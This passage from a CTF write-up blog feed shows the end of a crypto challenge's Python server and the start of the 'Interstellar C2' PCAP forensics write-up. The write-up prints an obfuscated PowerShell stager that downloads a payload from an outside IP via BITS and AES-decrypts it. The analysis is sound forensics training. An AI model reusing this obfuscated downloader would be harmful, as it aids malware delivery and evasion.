&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">book&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Book&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ciphertext&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">book&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">encrypt&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">FLAG&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">page_number&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">1&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">while&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">True&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">option&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">menu&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">option&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">"L"&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk3"># ascii_print(ciphertext, key, page_number)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">ciphertext&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">page_number&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">elif&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">option&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">"T"&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ciphertext&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">book&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">encrypt&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">FLAG&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">page_number&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">+=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">2&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">elif&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">option&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">"C"&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk7 mtki">f&lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk6">\n{&lt;/span>&lt;span class="mtk8 mtku">list&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">ciphertext&lt;/span>&lt;span class="mtk1">)&lt;/span>&lt;span class="mtk6">}\n{&lt;/span>&lt;span class="mtk8 mtku">list&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1">)&lt;/span>&lt;span class="mtk6">}\n&lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk6">\n&lt;/span>&lt;span class="mtk4">Invalid option!&lt;/span>&lt;span class="mtk6">\n&lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk1">)&lt;/span>


&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">__name__&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">"__main__"&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">try&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">main&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">except&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Exception&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">as&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk7 mtki">f&lt;/span>&lt;span class="mtk4">"An error occurred: &lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk6">}&lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;h2 id="encryption-analysis">Encryption analysis&lt;/h2>
&lt;p>The server uses a custom function named &lt;code>ascii_print&lt;/code> that is not available (option &lt;code>L&lt;/code>), but the only thing that does is print numbers like if they were inside a book:&lt;/p></description></item><item><title>Interstellar C2</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/interstellar-c2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/interstellar-c2/</guid><description>&lt;p>We are given a PCAP file called &lt;code>capture.pcapng&lt;/code>. Let&amp;rsquo;s open it in Wireshark:&lt;/p>
&lt;p>&lt;img alt="Interstellar C2 1" src="https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202023/Interstellar-C2-1.webp">&lt;/p>
&lt;p>As always, it is nice to start analyzing top-level protocols like HTTP, so let&amp;rsquo;s apply a filter:&lt;/p>
&lt;p>&lt;img alt="Interstellar C2 2" src="https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202023/Interstellar-C2-2.webp">&lt;/p>
&lt;p>The first request is trying to download a PowerShell script called &lt;code>vn84.ps1&lt;/code>:&lt;/p>
&lt;p>&lt;img alt="Interstellar C2 3" src="https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202023/Interstellar-C2-3.webp">&lt;/p>
&lt;h2 id="powershell-deobfuscation">PowerShell deobfuscation&lt;/h2>
&lt;p>We can take the script from Wireshark and read it here:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk1"> .(&lt;/span>&lt;span class="mtk4">"{1}{0}{2}"&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk4">'T'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'Set-i'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'em'&lt;/span>&lt;span class="mtk1">) (&lt;/span>&lt;span class="mtk4">'vAriA'&lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk4">'ble'&lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk4">':q'&lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk4">'L'&lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk4">'z0so'&lt;/span>&lt;span class="mtk1">) ( [&lt;/span>&lt;span class="mtk7 mtki">tYpe&lt;/span>&lt;span class="mtk1">](&lt;/span>&lt;span class="mtk4">"{0}{1}{2}{3}"&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">-F&lt;/span>&lt;span class="mtk4">'SySTEM.i'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'o.Fi'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'lE'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'mode'&lt;/span>&lt;span class="mtk1">)) ; &lt;/span>&lt;span class="mtk5">&amp;amp;&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"{0}{2}{1}"&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk4">'set-Vari'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'E'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'ABL'&lt;/span>&lt;span class="mtk1">) l60Yu3 ( [&lt;/span>&lt;span class="mtk7 mtki">tYPe&lt;/span>&lt;span class="mtk1">](&lt;/span>&lt;span class="mtk4">"{7}{0}{5}{4}{3}{1}{2}{6}"&lt;/span>&lt;span class="mtk5">-F&lt;/span>&lt;span class="mtk4">'m.'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'ph'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'Y.ae'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'A'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'TY.crypTOgR'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'SeCuRi'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'S'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'sYSte'&lt;/span>&lt;span class="mtk1">)); .(&lt;/span>&lt;span class="mtk4">"{0}{2}{1}{3}"&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'Set-V'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'i'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'AR'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'aBle'&lt;/span>&lt;span class="mtk1">) BI34 ( [&lt;/span>&lt;span class="mtk7 mtki">TyPE&lt;/span>&lt;span class="mtk1">](&lt;/span>&lt;span class="mtk4">"{4}{7}{0}{1}{3}{2}{8}{5}{10}{6}{9}"&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'TEm.secU'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'R'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'Y.CrY'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'IT'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'s'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'Y.'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'D'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'yS'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'pTogrAPH'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'E'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'CrypTOSTReAmmo'&lt;/span>&lt;span class="mtk1">)); ${U`Rl} &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk4">"{0}{4}{1}{5}{8}{6}{2}{7}{9}{3}"&lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'htt'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'4f0'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'53-41ab-938'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'d8e51'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'p://64.226.84.200/9497'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'8'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'58'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'a-ae1bd8'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'-'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'6'&lt;/span>&lt;span class="mtk1">) &lt;/span> 
&lt;span class="mtk1">${P`TF} &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk1">$env:temp&lt;/span>&lt;span class="mtk4">\94974f08-5853-41ab-938a-ae1bd86d8e51"&lt;/span>&lt;span class="mtk1"> &lt;/span>
&lt;span class="mtk1">.(&lt;/span>&lt;span class="mtk4">"{2}{1}{3}{0}"&lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk4">'ule'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'M'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'Import-'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'od'&lt;/span>&lt;span class="mtk1">) (&lt;/span>&lt;span class="mtk4">"{2}{0}{3}{1}"&lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'r'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'fer'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'BitsT'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'ans'&lt;/span>&lt;span class="mtk1">) &lt;/span>
&lt;span class="mtk1">.(&lt;/span>&lt;span class="mtk4">"{4}{5}{3}{1}{2}{0}"&lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk4">'r'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'-BitsT'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'ransfe'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'t'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'S'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'tar'&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">-&lt;/span>&lt;span class="mtk1">Source ${u`Rl} &lt;/span>&lt;span class="mtk5">-&lt;/span>&lt;span class="mtk1">Destination ${p`Tf} &lt;/span>
&lt;span class="mtk1">${Fs} &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;amp;&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"{1}{0}{2}"&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'w-Ob'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'Ne'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'ject'&lt;/span>&lt;span class="mtk1">) (&lt;/span>&lt;span class="mtk4">"{1}{2}{0}"&lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'eam'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'IO.'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'FileStr'&lt;/span>&lt;span class="mtk1">)(${p`Tf}&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk1"> ( &lt;/span>&lt;span class="mtk5">&amp;amp;&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"{3}{1}{0}{2}"&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk4">'lDIt'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'hi'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'eM'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'c'&lt;/span>&lt;span class="mtk1">) (&lt;/span>&lt;span class="mtk4">'VAria'&lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk4">'blE'&lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk4">':Q'&lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk4">'L'&lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk4">'z0sO'&lt;/span>&lt;span class="mtk1">)).VALue::&lt;/span>&lt;span class="mtk4">"oP&lt;/span>&lt;span class="mtk6">`e&lt;/span>&lt;span class="mtk4">N"&lt;/span>&lt;span class="mtk1">) &lt;/span>
&lt;span class="mtk1">${MS} &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> .(&lt;/span>&lt;span class="mtk4">"{3}{1}{0}{2}"&lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk4">'c'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'je'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'t'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'New-Ob'&lt;/span>&lt;span class="mtk1">) (&lt;/span>&lt;span class="mtk4">"{5}{3}{0}{2}{4}{1}"&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk4">'O.Memor'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'eam'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'y'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'stem.I'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'Str'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'Sy'&lt;/span>&lt;span class="mtk1">); &lt;/span>
&lt;span class="mtk1">${a`es} &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk5">&amp;amp;&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'GI'&lt;/span>&lt;span class="mtk1">) VARiaBLe:l60Yu3).VAluE::(&lt;/span>&lt;span class="mtk4">"{1}{0}"&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk4">'reate'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'C'&lt;/span>&lt;span class="mtk1">).Invoke() &lt;/span>
&lt;span class="mtk1">${a`Es}.&lt;/span>&lt;span class="mtk4">"KE`Y`sIZE"&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">128&lt;/span>&lt;span class="mtk1"> &lt;/span>
&lt;span class="mtk1">${K`EY} &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> [&lt;/span>&lt;span class="mtk7 mtki">byte&lt;/span>&lt;span class="mtk1">[]] (&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">) &lt;/span>
&lt;span class="mtk1">${iv} &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> [&lt;/span>&lt;span class="mtk7 mtki">byte&lt;/span>&lt;span class="mtk1">[]] (&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">) &lt;/span>
&lt;span class="mtk1">${a`ES}.&lt;/span>&lt;span class="mtk4">"K`EY"&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> ${K`EY} &lt;/span>
&lt;span class="mtk1">${A`es}.&lt;/span>&lt;span class="mtk4">"i`V"&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> ${i`V} &lt;/span>
&lt;span class="mtk1">${cS} &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> .(&lt;/span>&lt;span class="mtk4">"{1}{0}{2}"&lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk4">'e'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'N'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'w-Object'&lt;/span>&lt;span class="mtk1">) (&lt;/span>&lt;span class="mtk4">"{4}{6}{2}{9}{1}{10}{0}{5}{8}{3}{7}"&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'phy.Crypto'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'ptogr'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'ecuri'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'rea'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'Syste'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'S'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'m.S'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'m'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'t'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'ty.Cry'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'a'&lt;/span>&lt;span class="mtk1">)(${m`S}&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk1"> ${a`Es}.(&lt;/span>&lt;span class="mtk4">"{0}{3}{2}{1}"&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk4">'Cre'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'or'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'pt'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'ateDecry'&lt;/span>&lt;span class="mtk1">).Invoke()&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk5">&amp;amp;&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"{1}{2}{0}"&lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'ARIaBLE'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'Ge'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'T-V'&lt;/span>&lt;span class="mtk1">) bI34 &lt;/span>&lt;span class="mtk5">-&lt;/span>&lt;span class="mtk1">VaLue )::&lt;/span>&lt;span class="mtk4">"W`RItE"&lt;/span>&lt;span class="mtk1">); &lt;/span>
&lt;span class="mtk1">${f`s}.(&lt;/span>&lt;span class="mtk4">"{1}{0}"&lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'To'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'Copy'&lt;/span>&lt;span class="mtk1">).Invoke(${Cs}) &lt;/span>
&lt;span class="mtk1">${d`ecD} &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> ${M`s}.(&lt;/span>&lt;span class="mtk4">"{0}{1}{2}"&lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk4">'T'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'oAr'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'ray'&lt;/span>&lt;span class="mtk1">).Invoke() &lt;/span>
&lt;span class="mtk1">${C`S}.(&lt;/span>&lt;span class="mtk4">"{1}{0}"&lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'te'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'Wri'&lt;/span>&lt;span class="mtk1">).Invoke(${d`ECD}&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk1"> ${d`ECd}.&lt;/span>&lt;span class="mtk4">"LENg`TH"&lt;/span>&lt;span class="mtk1">); &lt;/span>
